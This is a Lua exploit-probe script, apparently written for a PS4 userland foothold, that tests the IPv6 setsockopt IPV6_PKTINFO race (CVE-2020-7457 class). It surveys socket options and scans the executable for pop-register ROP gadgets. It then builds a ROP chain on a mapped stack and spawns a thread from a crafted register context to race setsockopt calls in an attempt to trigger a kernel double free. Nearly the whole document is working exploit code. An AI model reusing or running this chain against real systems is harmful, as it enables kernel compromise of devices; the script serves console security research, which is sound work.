-- CRASH_CLASS: HIGH
-- PROBE 91a: IPv6 setsockopt race (CVE-2020-7457 class)
--
-- PS4 6.72 exploit used ip6_setpktopt race (double free on IPV6_PKTINFO).
-- A: IPv6 socket creation + option survey
-- B: Scan eboot .text for pop rdx/r10/r8 gadgets
-- C: Threaded setsockopt(IPV6_PKTINFO) race if feasible

print("=== PROBE 91a: IPv6 SETSOCKOPT RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil" end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0
local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local text_sz=rd(inf+0x110) or 0
if text_sz<0 then text_sz=text_sz+0x100000000 end
print("eboot text="..q(ebase).." sz="..string.format("0x%X",text_sz))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end
local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- A: IPv6 socket + option survey
-- ============================================================
print("")
print("--- A: IPv6 SOCKET ---")
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("socket(AF_INET6,DGRAM)="..s6)
if s6<=0 then
    s6=N(native.fcall_with_rax(stub,97,28,1,0))
    print("socket(AF_INET6,STREAM)="..s6)
end
if s6<=0 then
    print("IPv6 BLOCKED")
    print("canary="..N(native.fcall_with_rax(stub,20)))
    print("=== 91a DONE ===")
    return
end

local PV6=41
local ob=memory.alloc(64); z(ob,64)
local opts={
    {27,"V6ONLY",1,4},{36,"RECVPKTINFO",1,4},{46,"PKTINFO",0,20},
    {61,"TCLASS",0,4},{57,"RECVTCLASS",1,4},{42,"USE_MIN_MTU",1,4},
    {10,"MCAST_HOPS",1,4},{4,"UNICAST_HOPS",64,4},
    {49,"HOPOPTS",0,0},{50,"DSTOPTS",0,0},{51,"RTHDR",0,0},{48,"NEXTHOP",0,0}
}
local pktinfo_ok=false
for _,o in ipairs(opts) do
    z(ob,64)
    if o[4]==4 then wd(ob,o[3]) end
    local ov=(o[4]>0) and N(ob) or 0
    local rv=N(native.fcall_with_rax(stub,105,s6,PV6,o[1],ov,o[4]))
    print("  "..o[2].."("..o[1]..")="..rv)
    if o[1]==46 and rv==0 then pktinfo_ok=true end
end

-- ============================================================
-- B: Gadget scan (first 1MB of eboot .text)
-- ============================================================
print("")
print("--- B: GADGET SCAN ---")
local scan_lim=math.min(text_sz,0x100000)
local G_RDX,G_R10,G_R8,G_RSP=nil,nil,nil,nil
local p2,p3=nil,nil

for off=0,scan_lim-4,4 do
    local v=rd(ebase+off)
    if not v then break end
    local b0=v%256
    local b1=math.floor(v/256)%256
    local b2=math.floor(v/65536)%256
    local b3=math.floor(v/16777216)%256

    if p3 then
        if p3==0x5A and b0==0xC3 and not G_RDX then G_RDX=off-1 end
        if p2==0x41 and p3==0x5A and b0==0xC3 and not G_R10 then G_R10=off-2 end
        if p2==0x41 and p3==0x58 and b0==0xC3 and not G_R8 then G_R8=off-2 end
        if p3==0x5C and b0==0xC3 and not G_RSP then G_RSP=off-1 end
        if p3==0x41 and b0==0x5A and b1==0xC3 and not G_R10 then G_R10=off-1 end
        if p3==0x41 and b0==0x58 and b1==0xC3 and not G_R8 then G_R8=off-1 end
    end

    if not G_RDX then
        if b0==0x5A and b1==0xC3 then G_RDX=off
        elseif b1==0x5A and b2==0xC3 then G_RDX=off+1
        elseif b2==0x5A and b3==0xC3 then G_RDX=off+2 end
    end
    if not G_R10 then
        if b0==0x41 and b1==0x5A and b2==0xC3 then G_R10=off
        elseif b1==0x41 and b2==0x5A and b3==0xC3 then G_R10=off+1 end
    end
    if not G_R8 then
        if b0==0x41 and b1==0x58 and b2==0xC3 then G_R8=off
        elseif b1==0x41 and b2==0x58 and b3==0xC3 then G_R8=off+1 end
    end
    if not G_RSP then
        if b0==0x5C and b1==0xC3 then G_RSP=off
        elseif b1==0x5C and b2==0xC3 then G_RSP=off+1
        elseif b2==0x5C and b3==0xC3 then G_RSP=off+2 end
    end

    p2=b2; p3=b3
    if G_RDX and G_R10 and G_R8 and G_RSP then break end
end

local function gp(name,off)
    if off then print("  "..name.." at +"..string.format("0x%X",off))
    else print("  "..name.." NOT FOUND") end
end
gp("pop rdx;ret",G_RDX)
gp("pop r10;ret",G_R10)
gp("pop r8;ret",G_R8)
gp("pop rsp;ret",G_RSP)

-- ============================================================
-- C: Threaded setsockopt race
-- ============================================================
print("")
print("--- C: RACE ---")

if not pktinfo_ok then
    print("IPV6_PKTINFO unavailable — skip race")
    native.fcall_with_rax(stub,6,s6)
    print("canary="..N(native.fcall_with_rax(stub,20)))
    print("=== 91a DONE ===")
    return
end

if not G_RDX then
    print("no pop rdx gadget — child cannot loop setsockopt correctly")
    print("running single-shot race (1 child call + N main calls)")
end

local PRDX=nil
if G_RDX then PRDX=uint64(string.format("0x%X%08X",ehi,elo+G_RDX)) end

local STSZ=0x10000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

local off=0
local ncycles
if PRDX then
    ncycles=math.floor((STSZ-200)/40)
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(46)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
else
    ncycles=0
end

local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8
print(ncycles.." child cycles ("..(PRDX and "full RDX reset" or "single-shot")..")")

local pi_a=memory.alloc(20); z(pi_a,20); wd(pi_a+16,1)
local pi_b=memory.alloc(20); z(pi_b,20); wd(pi_b+16,2)

local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(105))
wq(ctx+_DI,uint64(s6))
wq(ctx+_SI,uint64(PV6))
wq(ctx+_DX,uint64(46))
wq(ctx+_R10,uint64(N(pi_b)))
wq(ctx+_R8,uint64(20))

local vm0=vmc()
local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

local m_ok,m_fail=0,0
for i=1,3000 do
    local rv=N(native.fcall_with_rax(stub,105,s6,PV6,46,N(pi_a),20))
    if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end
end

local vm1=vmc()
print("main: ok="..m_ok.." fail="..m_fail)
print("VM: "..vm0.." -> "..vm1.." d="..(vm1-vm0))
print("child alive="..tostring(alive(tid)))

print("")
print("--- RESULT ---")
local total=m_ok+(PRDX and ncycles or 1)
print("survived "..total.." setsockopt(PKTINFO) calls")
if m_ok>0 then
    print("no kernel panic — ip6_setpktopt race likely PATCHED")
else
    print("setsockopt failing — IPV6_PKTINFO may not be raceable")
end

native.fcall_with_rax(stub,6,s6)
if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91a DONE ===")
